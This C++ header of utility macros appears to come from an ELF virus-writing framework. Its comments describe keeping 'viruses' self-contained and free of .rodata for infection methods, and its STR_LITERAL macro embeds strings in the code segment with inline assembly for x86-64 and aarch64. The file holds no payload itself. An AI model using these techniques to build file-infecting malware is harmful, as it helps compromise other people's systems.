#pragma once

#define MAKE_NON_COPYABLE(class_name)     \
  class_name(const class_name&) = delete; \
  class_name& operator=(const class_name&) = delete;

#define MAKE_NON_MOVABLE(class_name) \
  class_name(class_name&&) = delete; \
  class_name& operator=(class_name&&) = delete;

#define MAKE_COPYABLE(class_name)          \
  class_name(const class_name&) = default; \
  class_name& operator=(const class_name&) = default;

#define MAKE_MOVABLE(class_name)      \
  class_name(class_name&&) = default; \
  class_name& operator=(class_name&&) = default;

#define MAKE_NON_COPYABLE_AND_NON_MOVABLE(class_name) \
  MAKE_NON_COPYABLE(class_name);                      \
  MAKE_NON_MOVABLE(class_name);

#define MAKE_COPYABLE_AND_MOVABLE(class_name) \
  MAKE_COPYABLE(class_name);                  \
  MAKE_MOVABLE(class_name);

// compile sometimes puts constants inside .rodata. Use this macro to disable
// that.
#define DO_NOT_OPTIMIZE_CONSTANT(x) \
  [] {                              \
    volatile auto ret = x;          \
    return ret;                     \
  }()

// Problem:
// Some syscall requires initialized string to work but our viruses must be
// self-contained. Therefore they cannot reference strings stored in .rodata.
// This can be worked around by merging virus's .rodata together with .text at
// the expense of a larger than desired virus. But this only works for infection
// methods that guarantee page alignment for arm, making the virus code
// non-portable.

// Solutions:
// For small strings (less than 8 chars including the null terminator), users
// may do:
//          char str[8] = {'m', 'y', '_', 's', 't', 'r', 0};
// which generates code to initialize the string on stack. Anything longer
// _might_ be put in .rodata. Users should always confirm that the virus has no
// .rodata section by:
//          readelf -e /PATH_TO_VIRUS | grep rodata
//
// Alternatively, users may resort to more tedious initialization:
//          char str[30] = {};
//          hello[0] = 'h'; hello[1] = 'e'; hello[2] = 'l'; ...
// This is very error prone and if the string is long, can take up lot of code
// space. Please consider the STR_LITERAL macro instead.
//
// The following macro uses an extra 8 bytes (aarch64) or 9 bytes (x86-64) of
// instructions for loading string address that resides in the text segment,
// which is not too bad for long strings.
// example:
//
//   // note the extra escape for both % and back slash.
//   const char* str =
//      STR_LITERAL("this binary %%s is infected\\n");
//   vf::printf(str, argv[0]);
//
// If it's guaranteed that the virus is relocated to a page aligned address,
// users can consider merging .text and .rodata without using this macro. Note
// that we do not align the next instruction on 4 byte boundary on x86, but we
// do that for aarch64 since arm instruction must be aligned.
#if defined(__x86_64__)
#define STR_LITERAL(literal)   \
  [] {                         \
    const char* str;           \
    asm("lea 1f(%%rip), %0 \n" \
        "jmp 3f\n"             \
        "1:\n"                 \
        ".asciz \"" literal    \
        "\"\n"                 \
        "3:\n"                 \
        : "=r"(str)            \
        :);                    \
    return str;                \
  }()

#elif defined(__aarch64__)
// Aarch64 must run instructions aligned to 4-byte addresses and therefore we
// pad the string transparently for users.
#define STR_LITERAL(literal) \
  [] {                       \
    const char* str;         \
    asm("adr %0, 1f\n"       \
        "b 2f\n"             \
        "1:\n"               \
        ".asciz \"" literal  \
        "\"\n"               \
        ".align 4\n"         \
        "2:\n"               \
        : "=r"(str)          \
        :);                  \
    return str;              \
  }()
#endif